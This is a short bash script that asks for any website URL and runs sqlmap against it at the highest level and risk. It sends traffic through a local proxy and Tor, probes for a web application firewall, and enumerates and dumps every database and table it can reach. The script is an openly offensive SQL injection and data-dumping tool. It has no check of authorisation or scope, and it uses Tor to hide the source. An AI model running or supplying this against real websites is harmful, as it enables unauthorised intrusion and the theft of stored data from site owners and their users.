#!/bin/bash

# Prompt for URL input
echo "Enter the URL of the website (e.g., http://example.com):"
read URL

# Run SQLMap with proxy, Tor, WAF detection, and additional options to check databases, tables, and dump data
sqlmap -u "$URL" --level=5 --risk=3 --proxy=http://127.0.0.1:8080 --tor --check-waf --threads 10 --dbs --tables --dump
